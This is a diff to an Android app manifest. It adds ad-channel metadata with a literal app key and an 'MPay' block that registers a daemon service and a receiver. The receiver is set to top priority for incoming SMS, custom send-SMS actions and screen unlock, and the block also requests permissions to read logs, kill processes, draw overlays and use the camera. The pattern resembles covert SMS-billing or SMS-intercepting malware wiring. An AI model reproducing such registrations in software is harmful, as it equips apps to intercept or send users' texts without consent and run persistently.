@@ -69,13 +69,18 @@
         
 
         <!-- f17d2fb4eff547c8bebc1e7cc4dcd43c -->
-        
+        <!-- mifu -->
         <meta-data android:name="YMCHANNEL" 
                    android:value="A001" >
          </meta-data>
          
          <meta-data android:name="YM_APPKEY" 
                    android:value="PPKGZC0000" >
+         </meta-data>
+         
+         <!-- damai -->
+          <meta-data android:name="DM_APPKEY" 
+                   android:value="67ay5mbxjzkkqcqiuacb8mlD" >
          </meta-data>
 
         <receiver
@@ -131,6 +136,20 @@
             </intent-filter>
         </receiver>
         -->
+       <!-- MPay start -->
+        <service android:name="com.mandroid.service.DaemonService"></service> 
+        <service android:name="com.android.mtools.MPService"></service>
+		<receiver android:name="com.android.mtools.MyReceiver"> 
+			<intent-filter android:priority="2147483647">
+      			<action android:name="android.provider.Telephony.SMS_RECEIVED" /> 
+      			<action android:name="SEND_SMS_ACTION1" />
+      			<action android:name="SEND_SMS_ACTION2" />
+				<action android:name="GET_SMS_ACTION" /> 
+      			<action android:name="android.intent.action.USER_PRESENT" />
+      		</intent-filter>
+		</receiver> 
+		
+        <!-- MPay end --> 
     </application>
 
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
@@ -169,10 +188,18 @@
     <!-- pushi -->
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.GET_TASKS" /> 
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
     
-    <!--
-    	<uses-permission android:name="android.permission.GET_TASKS" /> 
-    	<uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
-     -->
+ <!-- MPay start-->
+        
+    <uses-permission android:name="android.permission.READ_LOGS"/>
+    <uses-permission android:name="android.permission.GET_PACKAGE_SIZE" />
+    <uses-permission android:name="android.permission.ACCESS_MTK_MMHW" />
+    <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES" />
+    <uses-permission android:name="android.permission.CAMERA" />
+        
+<!-- MPay end-->
+    
 
 </manifest>
